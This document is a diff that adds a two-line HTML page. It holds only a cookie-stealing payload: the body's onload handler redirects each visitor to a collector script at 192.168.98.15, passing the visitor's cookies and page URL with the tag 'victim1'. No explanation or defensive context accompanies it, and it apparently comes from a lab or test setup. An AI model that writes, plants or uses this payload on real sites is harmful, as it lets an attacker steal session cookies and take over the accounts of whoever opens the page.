@@ -1,0 +1,2 @@
+<html><body onload='document.location.replace("http://192.168.98.15/post.asp?name=victim1&message=" + document.cookie + "<br>" + "URL:" + document.location);'>
+</body></html> 
